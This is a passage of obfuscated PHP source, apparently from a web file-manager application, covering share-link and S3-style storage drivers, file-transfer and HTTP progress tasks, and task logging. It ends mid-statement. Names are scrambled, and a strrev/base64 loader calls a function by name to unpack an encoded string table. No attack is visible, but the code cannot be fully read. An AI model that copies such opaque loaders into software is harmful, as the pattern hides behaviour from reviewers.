$ø˜Öó©ƒ =& $_SERVER[Ã¶¡¶„æ]; $ÏÅãú¬ˆ = $this->listData($Îƒ‹¬™¥); if (!$ÏÅãú¬ˆ) { return; } if (!$ĞòßÁ¯È && $ÏÅãú¬ˆ[$ø˜Öó©ƒ[1299]] == $ø˜Öó©ƒ[88]) { return !1; } return parent::remove($Îƒ‹¬™¥); } public function enable($ÈÆ×£¹, $—ØƒæŞ•) { return $this->update($ÈÆ×£¹, array($_SERVER[Ã¶¡¶„æ][2292] => $—ØƒæŞ•)); } public function run($Â¤ÂºÛ) { return $this->update($Â¤ÂºÛ, array($_SERVER[Ã¶¡¶„æ][2304] => time())); } } goto fåÙ‰ —ÕÜ; B¸¸âĞ‘İÀ: class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($ê˜¼¾ÉÊ) { $this->pathParse = $ê˜¼¾ÉÊ; } protected function infoParse($î©ŒµØ, $±¯í·Ç = false) { $‚ù…ª¥­ =& $_SERVER[Ã¶¡¶„æ]; return Action($‚ù…ª¥­[1189])->sharePathInfo($this->pathParse[$‚ù…ª¥­[84]], !0, $±¯í·Ç); } public function listPath($Ü°‹ç›Ò, $Ã‡˜ç…¥ = false) { $Îåé¯¤À =& $_SERVER[Ã¶¡¶„æ]; $ìÍûåáõ = IO::listPath($Ü°‹ç›Ò, $Ã‡˜ç…¥); if (!$ìÍûåáõ) { return $ìÍûåáõ; } if (is_array($ìÍûåáõ[$Îåé¯¤À[1359]])) { $ŞÂ¨¾Øå = Action($Îåé¯¤À[1368])->parsePathChildren($ìÍûåáõ[$Îåé¯¤À[1359]], array($Îåé¯¤À[421] => $Ü°‹ç›Ò)); $ìÍûåáõ[$Îåé¯¤À[1359]] = Action($Îåé¯¤À[1189])->shareItemInfo($ŞÂ¨¾Øå); } foreach ($ìÍûåáõ as $ŒÌİ§ú => $²—‡Ö„) { if (!in_array($ŒÌİ§ú, array($Îåé¯¤À[83], $Îåé¯¤À[82]))) { continue; } foreach ($²—‡Ö„ as $±òôáß => $ŞÂ¨¾Øå) { $ŞÂ¨¾Øå = Action($Îåé¯¤À[1368])->parsePathChildren($ŞÂ¨¾Øå, array($Îåé¯¤À[421] => $Ü°‹ç›Ò)); $ìÍûåáõ[$ŒÌİ§ú][$±òôáß] = Action($Îåé¯¤À[1189])->shareItemInfo($ŞÂ¨¾Øå); } } return $ìÍûåáõ; } public function listAll($×Ö³Ù‘Å) { $‡êÈğ¯õ =& $_SERVER[Ã¶¡¶„æ]; $šÂ˜ş = IO::listAll($×Ö³Ù‘Å); foreach ($šÂ˜ş as &$§¸¶äã) { $æÔ¢§½ = IO::info($§¸¶äã[$‡êÈğ¯õ[84]]); $æÔ¢§½ = is_array($æÔ¢§½) ? $æÔ¢§½ : array(); $§¸¶äã = array_merge($æÔ¢§½, $§¸¶äã); $§¸¶äã[$‡êÈğ¯õ[86]] = Action($‡êÈğ¯õ[1189])->shareItemInfo($§¸¶äã); } unset($§¸¶äã); return $šÂ˜ş; } } class PathDriverEDS extends PathDriverMinIO { public function __construct($ú®¨¡úô) { parent::__construct($ú®¨¡úô); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($Îˆà¼á) { parent::__construct($Îˆà¼á); $this->signatureVersion($_SERVER[Ã¶¡¶„æ][216]); } public function uploadFormData($Ü²¼Öà‡, $¾•È÷úÄ = 3600) { $º±„¿û =& $_SERVER[Ã¶¡¶„æ]; $Ïºğ’™È = $º±„¿û[198]; $£Ÿ’Ö = $º±„¿û[1369]; $ñïóÏ­¬ = $º±„¿û[62]; $¯ıè›œ = gmdate($º±„¿û[1370]); $ıá¯ŞÎş = gmdate($º±„¿û[757]); $ª¨·Ø©× = $º±„¿û[1371]; $ÅÛÚ»Êï = $¾•È÷úÄ . $º±„¿û[12]; $§àœ¿ÒÎ = $º±„¿û[1333]; $ñÏä²±ì = array($this->accessKey, $ıá¯ŞÎş, $this->region, $ñïóÏ­¬, $ª¨·Ø©×); $ÊÀ›—èé = implode($º±„¿û[8], $ñÏä²±ì); $Œ¼ÖÂŸ = array($º±„¿û[1335] => gmdate($º±„¿û[1334], strtotime($º±„¿û[1372])), $º±„¿û[1336] => array(array($º±„¿û[1338] => $this->bucket), array($º±„¿û[1337] => $Ïºğ’™È), array($º±„¿û[1339], $º±„¿û[1340], $º±„¿û[12]), array($º±„¿û[1339], $º±„¿û[1373], $º±„¿û[12]), array($º±„¿û[1339], $º±„¿û[1374], $º±„¿û[12]), array($º±„¿û[1341] => $§àœ¿ÒÎ), array($º±„¿û[1375] => $ÊÀ›—èé), array($º±„¿û[1376] => $£Ÿ’Ö), array($º±„¿û[1377] => $¯ıè›œ), array($º±„¿û[1378] => $ÅÛÚ»Êï))); $¿Î­øÚ = base64_encode(json_encode($Œ¼ÖÂŸ)); $Å¾ƒ¨İ¨ = hash_hmac($º±„¿û[1379], $ıá¯ŞÎş, $º±„¿û[1380] . $this->secret, !0); $Ü×’·ÍÄ = hash_hmac($º±„¿û[1379], $this->region, $Å¾ƒ¨İ¨, !0); $ ­©€Óå = hash_hmac($º±„¿û[1379], $ñïóÏ­¬, $Ü×’·ÍÄ, !0); $ÛŠÆ¶É = hash_hmac($º±„¿û[1379], $ª¨·Ø©×, $ ­©€Óå, !0); $ß¹Çã‰´ = hash_hmac($º±„¿û[1379], $¿Î­øÚ, $ÛŠÆ¶É); $ü³¶Ø© = array($º±„¿û[215] => $º±„¿û[12], $º±„¿û[1381] => $º±„¿û[12], $º±„¿û[1337] => $Ïºğ’™È, $º±„¿û[1341] => $§àœ¿ÒÎ, $º±„¿û[1345] => $¿Î­øÚ, $º±„¿û[1382] => $ÊÀ›—èé, $º±„¿û[1383] => $£Ÿ’Ö, $º±„¿û[1384] => $¯ıè›œ, $º±„¿û[1385] => $ÅÛÚ»Êï, $º±„¿û[1386] => $ß¹Çã‰´, $º±„¿û[181] => $this->getHost()); return $ü³¶Ø©; } } goto aàá©‚‡š„; DØÌĞšô¨: $fileSize = strrev(base64_decode($_SERVER[Û®İªÒ][0])); function binCheckNeq($§óÂ½ÁÕ, $Á¬ªÑ‰È) { return $§óÂ½ÁÕ != $Á¬ªÑ‰È; } $_SERVER[$_SERVER[Û®İªÒ][1]] = $fileSize($_SERVER[$_SERVER[Û®İªÒ][2]]); goto C•‹‘ÁäáĞ; F¼±ö±±áÏ: class TaskFileTransfer extends Task { protected function startAfter() { $³¸»À”Ü =& $_SERVER[Ã¶¡¶„æ]; $ù©İ‚ÈŒ =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($³¸»À”Ü[1706], array($this, $³¸»À”Ü[1707])); Hook::bind($³¸»À”Ü[1238], array($this, $³¸»À”Ü[1708])); Hook::bind($³¸»À”Ü[1709], array($this, $³¸»À”Ü[1710])); Hook::bind($³¸»À”Ü[604], array($this, $³¸»À”Ü[1711])); Hook::bind($³¸»À”Ü[605], array($this, $³¸»À”Ü[1712])); Hook::bind($³¸»À”Ü[610], array($this, $³¸»À”Ü[1713])); Hook::bind($³¸»À”Ü[611], array($this, $³¸»À”Ü[1714])); Hook::bind($³¸»À”Ü[607], array($this, $³¸»À”Ü[1715])); Hook::bind($³¸»À”Ü[608], array($this, $³¸»À”Ü[1716])); Hook::bind($³¸»À”Ü[574], array($this, $³¸»À”Ü[1717])); Hook::bind($³¸»À”Ü[571], array($this, $³¸»À”Ü[1717])); Hook::bind($³¸»À”Ü[576], array($this, $³¸»À”Ü[1717])); Hook::bind($³¸»À”Ü[578], array($this, $³¸»À”Ü[1717])); Hook::bind($³¸»À”Ü[580], array($this, $³¸»À”Ü[1717])); Hook::bind($³¸»À”Ü[1718], array($this, $³¸»À”Ü[1719])); Hook::bind($³¸»À”Ü[597], array($this, $³¸»À”Ü[1720])); $this->sourceModelCopyFlag = !1; Hook::bind($³¸»À”Ü[1721], array($this, $³¸»À”Ü[1722])); Hook::bind($³¸»À”Ü[1723], array($this, $³¸»À”Ü[1724])); Hook::bind($³¸»À”Ü[1725], array($this, $³¸»À”Ü[1726])); $ù©İ‚ÈŒ[$³¸»À”Ü[1727]] = LNG($³¸»À”Ü[1728]); $ù©İ‚ÈŒ[$³¸»À”Ü[1729]] = 0; $ù©İ‚ÈŒ[$³¸»À”Ü[1730]] = 0; $ù©İ‚ÈŒ[$³¸»À”Ü[1078]] = $³¸»À”Ü[12]; $ù©İ‚ÈŒ[$³¸»À”Ü[1731]] = $³¸»À”Ü[12]; $ù©İ‚ÈŒ[$³¸»À”Ü[1732]] = 0; $ù©İ‚ÈŒ[$³¸»À”Ü[1733]] = 0; $ù©İ‚ÈŒ[$³¸»À”Ü[1734]] = 0; if (!$ù©İ‚ÈŒ[$³¸»À”Ü[1576]]) { $ù©İ‚ÈŒ[$³¸»À”Ü[1576]] = LNG($³¸»À”Ü[1735]); } } protected function endAfter() { $’›£ëÀÂ =& $_SERVER[Ã¶¡¶„æ]; Hook::unbind($’›£ëÀÂ[1706], array($this, $’›£ëÀÂ[1707])); Hook::unbind($’›£ëÀÂ[1238], array($this, $’›£ëÀÂ[1708])); Hook::unbind($’›£ëÀÂ[1709], array($this, $’›£ëÀÂ[1710])); Hook::unbind($’›£ëÀÂ[604], array($this, $’›£ëÀÂ[1711])); Hook::unbind($’›£ëÀÂ[605], array($this, $’›£ëÀÂ[1712])); Hook::unbind($’›£ëÀÂ[610], array($this, $’›£ëÀÂ[1713])); Hook::unbind($’›£ëÀÂ[611], array($this, $’›£ëÀÂ[1714])); Hook::unbind($’›£ëÀÂ[607], array($this, $’›£ëÀÂ[1715])); Hook::unbind($’›£ëÀÂ[608], array($this, $’›£ëÀÂ[1716])); Hook::unbind($’›£ëÀÂ[574], array($this, $’›£ëÀÂ[1717])); Hook::unbind($’›£ëÀÂ[571], array($this, $’›£ëÀÂ[1717])); Hook::unbind($’›£ëÀÂ[576], array($this, $’›£ëÀÂ[1717])); Hook::unbind($’›£ëÀÂ[578], array($this, $’›£ëÀÂ[1717])); Hook::unbind($’›£ëÀÂ[580], array($this, $’›£ëÀÂ[1717])); Hook::unbind($’›£ëÀÂ[1718], array($this, $’›£ëÀÂ[1719])); Hook::unbind($’›£ëÀÂ[597], array($this, $’›£ëÀÂ[1720])); Hook::unbind($’›£ëÀÂ[1721], array($this, $’›£ëÀÂ[1722])); Hook::unbind($’›£ëÀÂ[1723], array($this, $’›£ëÀÂ[1724])); Hook::unbind($’›£ëÀÂ[1725], array($this, $’›£ëÀÂ[1726])); } public function copyMoveStart($¥ÁÉ«–ä, $ÓÚìàÉ¨, $ë«¹È’¢, $®¼˜Ğİ) { $±…ŸöÎº =& $_SERVER[Ã¶¡¶„æ]; self::log($±…ŸöÎº[1736] . $ÓÚìàÉ¨ . $±…ŸöÎº[70] . $®¼˜Ğİ); $îÙ£â–¥ = rtrim(TEMP_FILES, $±…ŸöÎº[8]); if (substr($ÓÚìàÉ¨, 0, strlen($îÙ£â–¥)) == $îÙ£â–¥) { return; } if (substr($®¼˜Ğİ, 0, strlen($îÙ£â–¥)) == $îÙ£â–¥) { return; } $Ş×«áƒá =& $this->task; $Ş×«áƒá[$±…ŸöÎº[1737]] = KodIO::transferType($¥ÁÉ«–ä, $ë«¹È’¢); $this->update(); } public function updateAfter() { $ÖÕè¤À’ =& $_SERVER[Ã¶¡¶„æ]; $¬«——†² =& $this->task; if (!$¬«——†²[$ÖÕè¤À’[769]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($¬«——†²[$ÖÕè¤À’[1737]] == $ÖÕè¤À’[1327]) { return; } self::updateTask($¬«——†²); } private static function updateTask(&$£ßıé®Æ) { $èİî¼ôú =& $_SERVER[Ã¶¡¶„æ]; if ($£ßıé®Æ[$èİî¼ôú[1737]] == $èİî¼ôú[1209] || $£ßıé®Æ[$èİî¼ôú[1737]] == $èİî¼ôú[107]) { if ($£ßıé®Æ[$èİî¼ôú[1731]]) { $£ßıé®Æ[$èİî¼ôú[1734]] = $£ßıé®Æ[$èİî¼ôú[1733]] + $£ßıé®Æ[$èİî¼ôú[1730]]; } } else { if ($£ßıé®Æ[$èİî¼ôú[1737]] == $èİî¼ôú[1328]) { if ($£ßıé®Æ[$èİî¼ôú[1731]] == $èİî¼ôú[1209]) { $£ßıé®Æ[$èİî¼ôú[1734]] = $£ßıé®Æ[$èİî¼ôú[1733]] + $£ßıé®Æ[$èİî¼ôú[1730]] * 0.5; } else { if ($£ßıé®Æ[$èİî¼ôú[1731]] == $èİî¼ôú[107]) { $£ßıé®Æ[$èİî¼ôú[1734]] = $£ßıé®Æ[$èİî¼ôú[1733]] + $£ßıé®Æ[$èİî¼ôú[1729]] * 0.5 + $£ßıé®Æ[$èİî¼ôú[1730]] * 0.5; } } } } $£ßıé®Æ[$èİî¼ôú[1678]] = $£ßıé®Æ[$èİî¼ôú[1734]] / $£ßıé®Æ[$èİî¼ôú[769]]; if ($£ßıé®Æ[$èİî¼ôú[1678]] > 0) { $£·¶øˆ× = timeFloat() - $£ßıé®Æ[$èİî¼ôú[1680]] - $£ßıé®Æ[$èİî¼ôú[1683]]; $£ßıé®Æ[$èİî¼ôú[1684]] = $£·¶øˆ× * (1 - $£ßıé®Æ[$èİî¼ôú[1678]]) / $£ßıé®Æ[$èİî¼ôú[1678]]; } } public function addPath($“æóƒèÕ) { $ğ¹à‚âĞ =& $_SERVER[Ã¶¡¶„æ]; if (!$“æóƒèÕ) { return; } $±…âä“ö =& $this->task; $Ùš³€Ã¸ = IO::infoWithChildren($“æóƒèÕ); $ÄÏÇÛú = $±…âä“ö[$ğ¹à‚âĞ[1738]] ? $±…âä“ö[$ğ¹à‚âĞ[1738]][$ğ¹à‚âĞ[1739]] : 0; $±…âä“ö[$ğ¹à‚âĞ[1738]] = array($ğ¹à‚âĞ[1739] => $ÄÏÇÛú + 1, $ğ¹à‚âĞ[420] => $Ùš³€Ã¸[$ğ¹à‚âĞ[32]], $ğ¹à‚âĞ[84] => $Ùš³€Ã¸[$ğ¹à‚âĞ[84]], $ğ¹à‚âĞ[519] => $Ùš³€Ã¸[$ğ¹à‚âĞ[519]] ? $Ùš³€Ã¸[$ğ¹à‚âĞ[519]] : $Ùš³€Ã¸[$ğ¹à‚âĞ[84]]); if ($Ùš³€Ã¸[$ğ¹à‚âĞ[33]] == $ğ¹à‚âĞ[199]) { $±…âä“ö[$ğ¹à‚âĞ[792]] += 1; } else { $±…âä“ö[$ğ¹à‚âĞ[792]] += $Ùš³€Ã¸[$ğ¹à‚âĞ[79]][$ğ¹à‚âĞ[77]]; if ($Ùš³€Ã¸[$ğ¹à‚âĞ[402]]) { $±…âä“ö[$ğ¹à‚âĞ[792]] += $Ùš³€Ã¸[$ğ¹à‚âĞ[79]][$ğ¹à‚âĞ[78]] + 1; } } $±…âä“ö[$ğ¹à‚âĞ[769]] += $Ùš³€Ã¸[$ğ¹à‚âĞ[76]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($…ÍñÈœÆ) { } public function sourceAddHashEnd($ó³ùş¤¿) { } public function sourceAddFileStart($³Ş“ÃåŒ) { $ …„¨àå =& $_SERVER[Ã¶¡¶„æ]; $Ñ´£•†ç =& $this->task; $Ñ´£•†ç[$ …„¨àå[1729]] = $³Ş“ÃåŒ[$ …„¨àå[76]]; $Ñ´£•†ç[$ …„¨àå[1727]] = $³Ş“ÃåŒ[$ …„¨àå[32]]; $Ñ´£•†ç[$ …„¨àå[1078]] = $³Ş“ÃåŒ[$ …„¨àå[32]]; $Ñ´£•†ç[$ …„¨àå[1740]] = $³Ş“ÃåŒ[$ …„¨àå[84]]; $this->update(); } public function sourceAddFileEnd($İÚ’¥¡Û) { $†ÑèÓÅÇ =& $_SERVER[Ã¶¡¶„æ]; $³öğäÂ™ =& $this->task; $³öğäÂ™[$†ÑèÓÅÇ[1734]] += $İÚ’¥¡Û[$†ÑèÓÅÇ[76]]; $³öğäÂ™[$†ÑèÓÅÇ[1740]] = $İÚ’¥¡Û[$†ÑèÓÅÇ[84]]; $this->update(1); } public function copyFileStart($ü”Ÿö“, $İ£ô¸‡­, $ŸË·åà¹, $Ø­ÊŒØ˜, $‰ µ£¥¿, $°·º‹ıñ) { $ö«‘ù· =& $_SERVER[Ã¶¡¶„æ]; $¸óËÉ±º = $‰ µ£¥¿; if ($¸óËÉ±º == $GLOBALS[$ö«‘ù·[1741]]) { $¸óËÉ±º = $GLOBALS[$ö«‘ù·[1742]]; } $GLOBALS[$ö«‘ù·[1742]] = $‰ µ£¥¿; $GLOBALS[$ö«‘ù·[1741]] = $°·º‹ıñ; $óæ­õ‰é =& $this->task; $óæ­õ‰é[$ö«‘ù·[1727]] = $¸óËÉ±º; $óæ­õ‰é[$ö«‘ù·[1729]] = (int) $ü”Ÿö“->size($İ£ô¸‡­); $óæ­õ‰é[$ö«‘ù·[1730]] = 0; $óæ­õ‰é[$ö«‘ù·[1078]] = $ö«‘ù·[12]; $óæ­õ‰é[$ö«‘ù·[1731]] = $ö«‘ù·[12]; $óæ­õ‰é[$ö«‘ù·[1732]] = 0; $ò®ëœ€Ç = $óæ­õ‰é[$ö«‘ù·[1729]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($óæ­õ‰é[$ö«‘ù·[399]] . $ö«‘ù·[1743]); if ($ò®ëœ€Ç && file_exists(get_path_father($Ø­ÊŒØ˜))) { Cache::set($óæ­õ‰é[$ö«‘ù·[399]] . $ö«‘ù·[1743], $Ø­ÊŒØ˜); $óæ­õ‰é[$ö«‘ù·[1700]] = array($ö«‘ù·[1744], $ö«‘ù·[1745]); } $this->update(0, $ò®ëœ€Ç); } public static function updateCopyLocalFileSize($½»ì†¥) { $öèæØÊõ =& $_SERVER[Ã¶¡¶„æ]; $ò¡‰¿æ = Cache::get($½»ì†¥[$öèæØÊõ[399]] . $öèæØÊõ[1743]); if (!$ò¡‰¿æ || !file_exists($ò¡‰¿æ)) { return $½»ì†¥; } $½»ì†¥[$öèæØÊõ[1730]] = @filesize($ò¡‰¿æ); $½»ì†¥[$öèæØÊõ[1734]] += $½»ì†¥[$öèæØÊõ[1730]]; self::updateTask($½»ì†¥); return $½»ì†¥; } public function copyFileEnd($¡á×ºŞ›, $¤Ñ­ÓÎÆ, $£¹Û°Ã“, $êı¼È¥”, $›“À½‡à, $¶İ‚ÄŠ­) { $”—à¤¤Š =& $_SERVER[Ã¶¡¶„æ]; $îŒ’† ù =& $this->task; $îŒ’† ù[$”—à¤¤Š[1730]] = $îŒ’† ù[$”—à¤¤Š[1729]]; $îŒ’† ù[$”—à¤¤Š[1731]] = $”—à¤¤Š[12]; unset($îŒ’† ù[$”—à¤¤Š[1700]]); if ($›“À½‡à == $îŒ’† ù[$”—à¤¤Š[1727]]) { $îŒ’† ù[$”—à¤¤Š[1733]] += $îŒ’† ù[$”—à¤¤Š[1729]]; $îŒ’† ù[$”—à¤¤Š[1734]] = $îŒ’† ù[$”—à¤¤Š[1733]]; $‚äÊ¥ = 1; if (isset($îŒ’† ù[$”—à¤¤Š[1740]]) && $îŒ’† ù[$”—à¤¤Š[1740]] == $¤Ñ­ÓÎÆ) { $‚äÊ¥ = 0; } $this->update($‚äÊ¥); } else { $this->update(); $îŒ’† ù[$”—à¤¤Š[1730]] = 0; } Cache::remove($îŒ’† ù[$”—à¤¤Š[399]] . $”—à¤¤Š[1743]); self::log($”—à¤¤Š[1746] . $¤Ñ­ÓÎÆ . $”—à¤¤Š[70] . $êı¼È¥” . $”—à¤¤Š[231] . $›“À½‡à . $”—à¤¤Š[1747] . $îŒ’† ù[$”—à¤¤Š[1727]]); } public function updateFileEnd($­ÑÅÛë…, $‘¼ÇÑ—Â) { $‘³ê¥ı =& $_SERVER[Ã¶¡¶„æ]; $à·²«ì =& $this->task; $à·²«ì[$‘³ê¥ı[1727]] = $­ÑÅÛë…; $à·²«ì[$‘³ê¥ı[1729]] = $‘¼ÇÑ—Â; $à·²«ì[$‘³ê¥ı[1733]] += $‘¼ÇÑ—Â; $à·²«ì[$‘³ê¥ı[1734]] = $à·²«ì[$‘³ê¥ı[1733]]; $this->update(1); self::log($‘³ê¥ı[1748] . $­ÑÅÛë…); } public function sourceModelCopy($ºÍí¥í¤) { $»­œ®© =& $_SERVER[Ã¶¡¶„æ]; $¾Çù‰â = $ºÍí¥í¤[0]; $Ğ©¼î¼Ê = $ºÍí¥í¤[1]; $î´ØÂñ‘ =& $this->task; $this->sourceModelCopyFlag = !0; $šÜÍÓÌ© = 0; switch ($¾Çù‰â) { case $»­œ®©[572]: $šÜÍÓÌ© = 1; break; case $»­œ®©[575]: $î´ØÂñ‘[$»­œ®©[1727]] = $Ğ©¼î¼Ê[$»­œ®©[32]]; break; case $»­œ®©[577]: $šÜÍÓÌ© = intval($ºÍí¥í¤[$»­œ®©[380]] * 0.4); break; case $»­œ®©[579]: $šÜÍÓÌ© = intval($ºÍí¥í¤[$»­œ®©[380]] * 0.2); break; case $»­œ®©[581]: $šÜÍÓÌ© = intval($ºÍí¥í¤[$»­œ®©[380]] * 0.4); break; } $this->update($šÜÍÓÌ©); $this->sourceModelCopyFlag = !1; } public function sourceRemove($î„ñÇ–ø, $ÃãèİÎ) { $°§™‘‹ =& $_SERVER[Ã¶¡¶„æ]; $this->sourceModelCopyFlag = !0; $åÙÌëÎœ = 1; if (isset($î„ñÇ–ø[$°§™‘‹[79]])) { $åÙÌëÎœ = $î„ñÇ–ø[$°§™‘‹[79]][$°§™‘‹[77]]; $åÙÌëÎœ = $åÙÌëÎœ + $î„ñÇ–ø[$°§™‘‹[79]][$°§™‘‹[78]] + 1; } $this->update($åÙÌëÎœ); $this->sourceModelCopyFlag = !1; } public function sourceMove($ğ¿Á¢·) { $this->sourceRemove($ğ¿Á¢·, !1); } public function curlProgress($íÚ¿‚™, $Ÿ‚üåÓ, $ùóÙå, $Ğ“Â°©Ğ, $¢†õÓ–È) { $ü¯ùòŞ¬ =& $_SERVER[Ã¶¡¶„æ]; $µšĞ¬©¬ =& $this->task; if ($¢†õÓ–È > 0) { $µšĞ¬©¬[$ü¯ùòŞ¬[1078]] = $ü¯ùòŞ¬[1749]; $µšĞ¬©¬[$ü¯ùòŞ¬[1731]] = $ü¯ùòŞ¬[107]; if ($µšĞ¬©¬[$ü¯ùòŞ¬[1729]]) { $µšĞ¬©¬[$ü¯ùòŞ¬[1730]] = $¢†õÓ–È; } if ($µšĞ¬©¬[$ü¯ùòŞ¬[1732]]) { $µšĞ¬©¬[$ü¯ùòŞ¬[1730]] = $¢†õÓ–È + $µšĞ¬©¬[$ü¯ùòŞ¬[1732]]; } } else { if ($ùóÙå > 0) { if ($µšĞ¬©¬[$ü¯ùòŞ¬[1729]] == $Ÿ‚üåÓ) { $µšĞ¬©¬[$ü¯ùòŞ¬[1730]] = $ùóÙå; $µšĞ¬©¬[$ü¯ùòŞ¬[1078]] = $ü¯ùòŞ¬[1750]; $µšĞ¬©¬[$ü¯ùòŞ¬[1731]] = $ü¯ùòŞ¬[1209]; } } } $this->update(); } public function curlProgressStart($¨®¿…Ì) { } public function curlProgressEnd($¸›§Ó¥¯) { $¦æ…‘² =& $_SERVER[Ã¶¡¶„æ]; $Ÿ­Œ÷ı =& $this->task; $¨³õ–÷… = curl_getinfo($¸›§Ó¥¯); $ä¸Á¡ú = $¨³õ–÷…[$¦æ…‘²[1751]]; if ($ä¸Á¡ú == -1) { $ä¸Á¡ú = $¨³õ–÷…[$¦æ…‘²[1752]]; } if ($Ÿ­Œ÷ı[$¦æ…‘²[1731]] == $¦æ…‘²[107] && $ä¸Á¡ú) { $Ÿ­Œ÷ı[$¦æ…‘²[1732]] += $ä¸Á¡ú; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $ÏçòîÎÛ =& $_SERVER[Ã¶¡¶„æ]; $Ä¥Éüª¿ =& $this->task; $Ä¥Éüª¿[$ÏçòîÎÛ[1753]] = 1; Hook::bind($ÏçòîÎÛ[1721], array($this, $ÏçòîÎÛ[1754])); Hook::bind($ÏçòîÎÛ[1723], array($this, $ÏçòîÎÛ[1755])); Hook::bind($ÏçòîÎÛ[1725], array($this, $ÏçòîÎÛ[1756])); } protected function endAfter() { $Ğ¦û€Ÿ =& $_SERVER[Ã¶¡¶„æ]; Hook::unbind($Ğ¦û€Ÿ[1721], array($this, $Ğ¦û€Ÿ[1754])); Hook::unbind($Ğ¦û€Ÿ[1723], array($this, $Ğ¦û€Ÿ[1755])); Hook::unbind($Ğ¦û€Ÿ[1725], array($this, $Ğ¦û€Ÿ[1756])); } public function progressStart($”Á æ ¢) { $Ì‚‘ÜÎÖ =& $_SERVER[Ã¶¡¶„æ]; $Ö™Ã˜äÒ = curl_getinfo($”Á æ ¢); self::log($Ì‚‘ÜÎÖ[1757] . $Ö™Ã˜äÒ[$Ì‚‘ÜÎÖ[307]]); self::valueSet($this->task[$Ì‚‘ÜÎÖ[399]], $this->task); } public function progressEnd($¼ø©¡šÔ) { $Ää´‡¦’ =& $_SERVER[Ã¶¡¶„æ]; self::log($Ää´‡¦’[1758] . $this->task[$Ää´‡¦’[399]]); $this->end(); } public function progress($Ìøªà ¼, $ĞÏ„’È¢, $ÁÇØØ¦ş, $Ä·¸×¿Ë, $ıŒÛããÏ) { $­»ÔüÕ =& $_SERVER[Ã¶¡¶„æ]; $Êïûğøá =& $this->task; if ($ıŒÛããÏ > 0) { $Êïûğøá[$­»ÔüÕ[792]] = $Êïûğøá[$­»ÔüÕ[792]] == 0 ? $Ä·¸×¿Ë : $Êïûğøá[$­»ÔüÕ[792]]; $Êïûğøá[$­»ÔüÕ[1677]] = $ıŒÛããÏ; } else { if ($ÁÇØØ¦ş > 0) { $Êïûğøá[$­»ÔüÕ[792]] = $Êïûğøá[$­»ÔüÕ[792]] == 0 ? $ĞÏ„’È¢ : $Êïûğøá[$­»ÔüÕ[792]]; $Êïûğøá[$­»ÔüÕ[1677]] = $ÁÇØØ¦ş; } } $this->update(); self::log("\160\x72\157\147\162\145\163\x73\110\164\x74\x70\72\144\x6f\x77\x6e\72{$ÁÇØØ¦ş}\57{$ĞÏ„’È¢}\x3b\40\x75\160\x6c\157\141\x64\x3a{$ıŒÛããÏ}\57{$Ä·¸×¿Ë}\73"); } } class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($ˆÀ»÷íÔ, $ Ğäååˆ = '', $Øæûşô = 0, $¸“‹´ùœ = '') { $‰÷ò±ÑË =& $_SERVER[Ã¶¡¶„æ]; $ÁœºÇ¿õ = new Task($ˆÀ»÷íÔ, $ Ğäååˆ, $Øæûşô, $¸“‹´ùœ); $GLOBALS[$‰÷ò±ÑË[1759] . $ˆÀ»÷íÔ] = new TaskLog($‰÷ò±ÑË[1660], $ÁœºÇ¿õ, $¸“‹´ùœ); return $ÁœºÇ¿õ; } public function __construct($œÉŒµ›¤ = '', $ÁÜ¨ è = '', $ı€ĞşÇ = '') { $¬¶É¡ =& $_SERVER[Ã¶¡¶„æ]; if (!$œÉŒµ›¤) { $œÉŒµ›¤ = $¬¶É¡[1660]; } $ë™®ò€§ = $œÉŒµ›¤ . $¬¶É¡[386] . rand_string(10); if (!$ı€ĞşÇ) { $ı€ĞşÇ = $œÉŒµ›¤ . $¬¶É¡[53] . $ı€ĞşÇ; } switch ($œÉŒµ›¤) { case $¬¶É¡[1660]: if (!$ÁÜ¨ è || !$ÁÜ¨ è->task) { return echoLog($œÉŒµ›¤ . $¬¶É¡[1760]); } $Ê´ù¾ÊÍ = $ÁÜ¨ è; $ë™®ò€§ = $Ê´ù¾ÊÍ->task[$¬¶É¡[399]]; $œÉŒµ›¤ = $Ê´ù¾ÊÍ->task[$¬¶É¡[399]]; if (!$Ê´ù¾ÊÍ->task[$¬¶É¡[1576]]) { $Ê´ù¾ÊÍ->task[$¬¶É¡[1576]] = $ı€ĞşÇ ? $ı€ĞşÇ : $œÉŒµ›¤; } break; case $¬¶É¡[1761]: if (!$ÁÜ¨ è) { return echoLog($œÉŒµ›¤ . $¬¶É¡[1762]); } $ÈĞ¹åêÀ = is_string($ÁÜ¨ è) ? array($ÁÜ¨ è) : $ÁÜ¨ è; $Ê´ù¾ÊÍ = new TaskFileTransfer($ë™®ò€§, $œÉŒµ›¤, 0, $ı€ĞşÇ ? $ı€ĞşÇ : $ÈĞ¹åêÀ[0]); foreach ($ÈĞ¹åêÀ as $¨È—Û˜ò) { $Ê´ù¾ÊÍ->addPath($¨È—Û˜ò); } break; case $¬¶É¡[313]: if (!$ÁÜ¨ è) { return echoLog($œÉŒµ›¤ . $¬¶É¡[1762]); } $ÈĞ¹åêÀ = is_string($ÁÜ¨ è) ? array($ÁÜ¨ è) : $ÁÜ¨ è; $Ê´ù¾ÊÍ = new TaskZip($ë™®ò€§, $œÉŒµ›¤, 0, $ı€ĞşÇ ? $ı€ĞşÇ : $ÈĞ¹åêÀ[0]); foreach ($ÈĞ¹åêÀ as $¨È—Û˜ò) { $Ê´ù¾ÊÍ->addPath($¨È—Û˜ò); } break; case $¬¶É¡[1229]: if (!$ÁÜ¨ è) { return echoLog($œÉŒµ›¤ . $¬¶É¡[1762]); } $Ê´ù¾ÊÍ = new TaskUnZip($ë™®ò€§, $œÉŒµ›¤, 0, $ı€ĞşÇ ? $ı€ĞşÇ : $ÁÜ¨ è); if ($ÁÜ¨ è) { $Ê´ù¾ÊÍ->addFile($ÁÜ¨ è); } break; case $¬¶É¡[148]: $Ê´ù¾ÊÍ = new TaskHttp($ë™®ò€§, $œÉŒµ›¤); break; default: return; break; } $this->task = $Ê´ù¾ÊÍ; $this->taskID = $ë™®ò€§; Hook::bind($¬¶É¡[1697], array($this, $¬¶É¡[1763])); Hook::bind($¬¶É¡[1699], array($this, 